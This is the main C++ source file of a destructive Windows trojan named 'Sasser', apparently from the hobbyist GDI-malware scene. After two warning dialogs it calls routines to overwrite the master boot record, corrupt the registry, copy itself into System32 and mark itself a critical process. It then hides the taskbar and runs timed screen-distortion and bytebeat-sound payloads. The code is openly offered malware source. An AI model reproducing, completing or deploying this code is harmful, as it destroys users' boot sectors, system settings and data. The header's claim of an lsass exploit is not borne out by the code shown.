#include "Sasser.h"

/* 						SASSER
A malware named after the network worm of the same name,
which circulated in 2004. (Gosh, it's 20 years old now.)
The original Sasser exploits a vulnerability in lsass,
				And so will this Sasser.
	This is my last malware because of how I'm feeling.
*/


void EndPayload(HANDLE hThread) {
	TerminateThread(hThread, 0);
	CloseHandle(hThread);

}

void __stdcall rdw(void) {
	RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE|RDW_ERASE|RDW_ALLCHILDREN);
}




int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdLine, int nCmdShow) {
	if (MessageBoxW(NULL, 
	L"You are now about to execute the Sasser GDI trojan made by NotCCR that will overwrite your MBR, disable system tools, copy itself to System32 and OOBE, move your cursor and set itself as a critical process!\nThe author of this software is not responsible for any damages.\n\nIf you want to keep your important data safe, hit \'No\' and nothing will happen.\nHowever, if you ensure you are running on a virtual environment, you may hit \'Yes\' to proceed with execution.\n\nAs said earlier, NotCCR (thepressed albuquerque) is not responsible for any damages made by any means with this malware, whether it\'s executing it, reverse-engineering it or any subsequent removal of this message box.\nProceed to execute?",
	L"Sasser",
	MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) != IDYES) exit(0);
	
	if (MessageBoxW(NULL,
	L"This is the last warning!\n\nThe creator of this malware does not take responsibility for any actions taken as a result of this malware!\nStill execute it?",
	L"Sasser (last warning)",
	MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) != IDYES) exit(0);
	
	OverwriteBootSector();
	CorruptRegistry();
	CopyMalwareFile();
//	MessageBoxW(NULL, L"Assess the damage.", L"ek", MB_OK); (This was in the test build of Sasser)
	CreateThread(NULL, 0, SetStrings, NULL, 0, 0);
	SetCritProcess();
	
	Sleep(7000);
	
	ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_HIDE);
	
	Sleep(2000);
	
	HANDLE hAGT = CreateThread(NULL, 0, GDI::AnimGradientTriangle, NULL, 0, 0);
	HANDLE hHTP = CreateThread(NULL, 0, GDI::HalftonePixelate, NULL, 0, 0);
	Bytebeat::Sound1();
	Sleep(29000);
	
	EndPayload(hHTP);
	rdw();
	
	HANDLE hETS = CreateThread(NULL, 0, GDI::EraseTrigonShake, NULL, 0, 0);
	HANDLE hSP = CreateThread(NULL, 0, GDI::StretchPayload, NULL, 0, 0);
	Bytebeat::Sound2();
	Sleep(29000);
	
	EndPayload(hETS);
	rdw();
	
	HANDLE hRR = CreateThread(NULL, 0, GDI::RadiusRhombus, NULL, 0, 0);
	HANDLE hRQS = CreateThread(NULL, 0, GDI::RgbquadShader1, NULL, 0, 0);
	Bytebeat::Sound3();
	Sleep(29000);
	
	EndPayload(hRR); EndPayload(hSP); EndPayload(hRQS);
	rdw();
	
	HANDLE hRM = CreateThread(NULL, 0, GDI::ReflectionMirroring, NULL, 0, 0);
	HANDLE hPRS = CreateThread(NULL, 0, GDI::PatRaysShake, NULL, 0, 0);
	Bytebeat::Sound4();
	Sleep(31000);
	
	EndPayload(hRM);
	rdw();
	Sleep(2000);
	
	HANDLE hTS = CreateThread(NULL, 0, GDI::TanSwirl, NULL, 0, 0);
//	Bytebeat::Sound5();
	Sleep(30000);
	
	EndPayload(hPRS); EndPayload(hTS);
	rdw();
	
	HANDLE hSM = CreateThread(NULL, 0, GDI::ScreenMelting, NULL, 0, 0);
	HANDLE hEM = CreateThread(NULL, 0, GDI::EraseMelt, NULL, 0, 0);
	Bytebeat::Sound6();
	Sleep(29000);
	
	EndPayload(hSM); EndPayload(hEM); EndPayload(hAGT);
	rdw();
	Sleep(2000);
	
	HANDLE hORZ = CreateThread(NULL, 0, GDI::ORRotozoomer, NULL, 0, 0);
	Bytebeat::Sound7();
	Sleep(30000);
	
	EndPayload(hORZ);
	rdw();
	
	CreateThread(NULL, 0, GDI::FinalGDIPayload, NULL, 0, 0);
	CreateThread(NULL, 0, Bytebeat::Sound8, NULL, 0, 0);
	Sleep(INFINITE);
}
